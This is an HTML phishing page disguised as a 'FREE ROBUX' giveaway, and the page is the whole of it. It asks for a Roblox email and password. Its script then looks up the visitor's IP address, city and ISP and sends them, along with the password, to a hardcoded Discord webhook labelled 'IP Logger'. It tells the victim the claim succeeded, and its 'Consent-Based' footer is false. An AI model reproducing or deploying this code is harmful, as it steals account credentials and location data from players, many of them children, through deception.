<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title> Robux  </title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg: #050507;
      --purple-deep: #1a0a2e;
      --purple-mid: #3d1a6e;
      --purple-glow: #7c3aed;
      --purple-bright: #a855f7;
      --purple-soft: #c084fc;
      --text: #f0e6ff;
      --text-muted: #9d8cb0;
      --card-bg: rgba(15, 8, 30, 0.85);
      --border: rgba(124, 58, 237, 0.35);
    }

    html, body {
      height: 100%;
      width: 100%;
      background: var(--bg);
      font-family: 'Syne', sans-serif;
      color: var(--text);
      overflow: hidden;
    }

    /* Animated background */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 80% 60% at 20% 80%, rgba(61, 26, 110, 0.45) 0%, transparent 70%),
        radial-gradient(ellipse 60% 50% at 80% 20%, rgba(124, 58, 237, 0.3) 0%, transparent 65%),
        radial-gradient(ellipse 40% 40% at 50% 50%, rgba(26, 10, 46, 0.6) 0%, transparent 80%);
      z-index: 0;
      animation: bgPulse 8s ease-in-out infinite alternate;
    }

    @keyframes bgPulse {
      0%   { opacity: 0.8; transform: scale(1); }
      100% { opacity: 1;   transform: scale(1.05); }
    }

    /* Floating particles */
    .particles {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 1;
      overflow: hidden;
    }
    .particle {
      position: absolute;
      border-radius: 50%;
      background: var(--purple-bright);
      opacity: 0;
      animation: float linear infinite;
    }
    @keyframes float {
      0%   { transform: translateY(110vh) scale(0); opacity: 0; }
      10%  { opacity: 0.6; }
      90%  { opacity: 0.2; }
      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
    }

    /* Center layout */
    .scene {
      position: relative;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      width: 100%;
      padding: 1.5rem;
    }

    /* Card */
    .card {
      position: relative;
      width: 100%;
      max-width: 520px;
      padding: 3.2rem 3rem 2.8rem;
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 20px;
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);

      /* Edge glow */
      box-shadow:
        0 0 0 1px rgba(124, 58, 237, 0.15),
        0 0 30px rgba(124, 58, 237, 0.25),
        0 0 80px rgba(124, 58, 237, 0.12),
        0 0 160px rgba(124, 58, 237, 0.06),
        inset 0 1px 0 rgba(200, 150, 255, 0.12);

      animation: cardIn 0.7s cubic-bezier(0.16, 1, 0.3, 1) both;
    }

    @keyframes cardIn {
      from { opacity: 0; transform: translateY(28px) scale(0.96); }
      to   { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* Corner accents */
    .card::before,
    .card::after {
      content: '';
      position: absolute;
      width: 18px;
      height: 18px;
      border-color: var(--purple-bright);
      border-style: solid;
      opacity: 0.7;
    }
    .card::before {
      top: -1px; left: -1px;
      border-width: 2px 0 0 2px;
      border-radius: 20px 0 0 0;
    }
    .card::after {
      bottom: -1px; right: -1px;
      border-width: 0 2px 2px 0;
      border-radius: 0 0 20px 0;
    }

    /* Title */
    .title-wrap {
      text-align: center;
      margin-bottom: 2rem;
      animation: fadeUp 0.7s 0.15s cubic-bezier(0.16, 1, 0.3, 1) both;
    }
    .label-tag {
      display: inline-block;
      font-family: 'Space Mono', monospace;
      font-size: 0.6rem;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--purple-soft);
      background: rgba(124, 58, 237, 0.12);
      border: 1px solid rgba(124, 58, 237, 0.3);
      border-radius: 4px;
      padding: 3px 10px;
      margin-bottom: 0.75rem;
    }
    h1 {
      font-size: 2.6rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      line-height: 1;
      background: linear-gradient(135deg, #fff 20%, var(--purple-soft) 60%, var(--purple-bright) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .subtitle {
      margin-top: 0.5rem;
      font-family: 'Space Mono', monospace;
      font-size: 0.7rem;
      color: var(--text-muted);
      letter-spacing: 0.05em;
    }

    /* Input */
    .input-wrap {
      position: relative;
      margin-bottom: 1.2rem;
      animation: fadeUp 0.7s 0.25s cubic-bezier(0.16, 1, 0.3, 1) both;
    }
    .input-wrap input,
    .input-wrap select {
      width: 100%;
      padding: 0.9rem 1.1rem 0.9rem 2.8rem;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(124, 58, 237, 0.3);
      border-radius: 10px;
      color: var(--text);
      font-family: 'Syne', sans-serif;
      font-size: 0.95rem;
      outline: none;
      transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
      appearance: none;
      -webkit-appearance: none;
    }
    .input-wrap select option {
      background: #1a0a2e;
      color: var(--text);
    }
    .input-wrap input::placeholder { color: var(--text-muted); }
    .input-wrap select.placeholder-active { color: var(--text-muted); }
    .input-wrap input:focus,
    .input-wrap select:focus {
      border-color: var(--purple-glow);
      background: rgba(124, 58, 237, 0.07);
      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.15), 0 0 20px rgba(124, 58, 237, 0.1);
    }
    .input-row .input-wrap { margin-bottom: 0; animation: none; }
    .input-icon {
      position: absolute;
      left: 0.9rem;
      top: 50%;
      transform: translateY(-50%);
      opacity: 0.5;
      font-size: 0.9rem;
      pointer-events: none;
    }

    /* Button */
    .btn {
      width: 100%;
      padding: 0.9rem 1.5rem;
      background: linear-gradient(135deg, var(--purple-mid), var(--purple-glow));
      border: 1px solid rgba(168, 85, 247, 0.5);
      border-radius: 10px;
      color: #fff;
      font-family: 'Syne', sans-serif;
      font-size: 0.95rem;
      font-weight: 700;
      letter-spacing: 0.06em;
      text-transform: uppercase;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: transform 0.15s, box-shadow 0.25s;
      animation: fadeUp 0.7s 0.45s cubic-bezier(0.16, 1, 0.3, 1) both;
    }
    .btn::before {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, rgba(255,255,255,0.12), transparent);
      opacity: 0;
      transition: opacity 0.2s;
    }
    .btn:hover::before { opacity: 1; }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 30px rgba(124, 58, 237, 0.45), 0 0 60px rgba(124, 58, 237, 0.2);
    }
    .btn:active { transform: translateY(0); }
    .btn.loading { pointer-events: none; opacity: 0.75; }

    /* Ripple */
    .ripple {
      position: absolute;
      border-radius: 50%;
      background: rgba(255,255,255,0.25);
      transform: scale(0);
      animation: rippleAnim 0.5s linear;
      pointer-events: none;
    }
    @keyframes rippleAnim {
      to { transform: scale(4); opacity: 0; }
    }

    /* Status */
    .status {
      margin-top: 1rem;
      padding: 0.65rem 1rem;
      border-radius: 8px;
      font-family: 'Space Mono', monospace;
      font-size: 0.72rem;
      text-align: center;
      opacity: 0;
      transform: translateY(6px);
      transition: opacity 0.3s, transform 0.3s;
      letter-spacing: 0.03em;
    }
    .status.show { opacity: 1; transform: translateY(0); }
    .status.success {
      background: rgba(34, 197, 94, 0.1);
      border: 1px solid rgba(34, 197, 94, 0.3);
      color: #86efac;
    }
    .status.error {
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #fca5a5;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* Footer */
    .footer {
      position: fixed;
      bottom: 1.2rem;
      font-family: 'Space Mono', monospace;
      font-size: 0.6rem;
      color: rgba(157, 140, 176, 0.35);
      letter-spacing: 0.1em;
      z-index: 2;
    }
  </style>
</head>
<body>

  <!-- Particles -->
  <div class="particles" id="particles"></div>

  <div class="scene">
    <div class="card">
      <div class="title-wrap">
        <div class="label-tag">&#9679; ACTIVE</div>
        <h1> FREE ROBUX </h1>
        <p class="subtitle"> Use the same email as in your roblox</p>
      </div>

      <div class="input-wrap">
        <span class="input-icon">⌨</span>
        <input type="text" id="username" placeholder="Enter your email id" maxlength="32" autocomplete="off" spellcheck="false"/>
      </div>

      <div class="input-wrap">
        <span class="input-icon">🗝️</span>
        <input type="text" id="age" placeholder="Enter your Password" min="1" max="120" autocomplete="off"/>
      </div>



      <button class="btn" id="logBtn" onclick="logIP()">
        Claim
      </button>

      <div class="status" id="status"></div>
    </div>
  </div>

  <div class="footer"> Vercel &nbsp;/&nbsp; @2017</div>

  <script>
    // ── Particles ────────────────────────────────────────────
    const container = document.getElementById('particles');
    for (let i = 0; i < 22; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      const size = Math.random() * 3 + 1;
      p.style.cssText = `
        width:${size}px; height:${size}px;
        left:${Math.random()*100}%;
        animation-duration:${Math.random()*12+8}s;
        animation-delay:${Math.random()*10}s;
        opacity:0;
      `;
      container.appendChild(p);
    }

    // ── Ripple on button ─────────────────────────────────────
    document.getElementById('logBtn').addEventListener('click', function(e) {
      const r = document.createElement('span');
      r.className = 'ripple';
      const rect = this.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      r.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-rect.left-size/2}px;top:${e.clientY-rect.top-size/2}px`;
      this.appendChild(r);
      setTimeout(() => r.remove(), 500);
    });

    // ── Main logger ──────────────────────────────────────────
    async function logIP() {
      const usernameInput = document.getElementById('username');
      const ageInput = document.getElementById('age');
      const btn = document.getElementById('logBtn');
      const username = usernameInput.value.trim();
      const age = ageInput.value.trim();

      if (!username) { showStatus('enter your email id.', 'error'); usernameInput.focus(); return; }
      if (!age) { showStatus('Please enter your password.', 'error'); ageInput.focus(); return; }

      btn.classList.add('loading');
      btn.textContent = 'Claiming...';
      hideStatus();

      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        let location = 'Unknown';
        let isp = 'Unknown';
        try {
          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
          const geo = await geoRes.json();
          location = `${geo.city || '?'}, ${geo.region || '?'}, ${geo.country_name || '?'}`;
          isp = geo.org || 'Unknown';
        } catch (_) {}

        const now = new Date();
        const timestamp = now.toUTCString();

        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1491876496720134186/Q5cHt7Q88nCGTpFJiVhxGLj5IA6enq9ozZrycs-PvXjMz5Bu0ZJ0ZcGVZtn57THoOq02';

        const payload = {
          username: 'IP Logger',
          avatar_url: 'https://i.imgur.com/4M34hi2.png',
          embeds: [{
            title: '📡 New IP Log',
            color: 0x7c3aed,
            fields: [
              { name: 'Email id', value: `\`${username}\``, inline: true },
              { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
              { name: 'Password', value: `\`${age}\``, inline: true },
              { name: '📍 Location', value: location, inline: false },
              { name: '🏢 ISP / Org', value: isp, inline: false },
              { name: '🕐 Timestamp', value: timestamp, inline: false }
            ],
            footer: { text: 'IP Logger • Consent-Based' },
            timestamp: now.toISOString()
          }]
        };

        const whRes = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (whRes.ok || whRes.status === 204) {
          showStatus('✓ Claimed successfully! Check your email.', 'success');
          usernameInput.value = '';
          ageInput.value = '';
        } else {
          showStatus(`Webhook error: ${whRes.status}`, 'error');
        }

      } catch (err) {
        showStatus('Network error. Please try again.', 'error');
        console.error(err);
      } finally {
        btn.classList.remove('loading');
        btn.textContent = 'claim';
      }
    }

    function showStatus(msg, type) {
      const el = document.getElementById('status');
      el.textContent = msg;
      el.className = `status ${type} show`;
    }
    function hideStatus() {
      const el = document.getElementById('status');
      el.className = 'status';
    }

    // Enter key support
    document.getElementById('username').addEventListener('keydown', e => {
      if (e.key === 'Enter') logIP();
    });
  </script>
</body>
</html>
